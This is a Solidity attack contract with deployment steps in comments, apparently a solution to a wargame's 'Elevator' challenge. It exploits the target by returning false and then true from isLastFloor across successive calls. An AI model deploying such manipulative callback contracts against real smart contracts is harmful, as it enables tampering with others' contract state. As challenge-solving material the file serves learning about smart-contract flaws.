// 1 - Deploy the contract with Remix using Injected Provider - Metamask
// 2 - Call attack() function of attacker contract - Metamask
// 3 - Check top and floor - Chrome Console
// await contract.top()
// const floor = await contract.floor()
// floor.toString()

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttacker {
    IElevator public elevator;
    uint8 public count;

    constructor(address challengeAddress) public payable {
        elevator = IElevator(challengeAddress);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        count++;
        if (count == 1) {
            return false;
        } else {
            return true;
        }
    }

    function attack() external {
        elevator.goTo(30);
    }
}
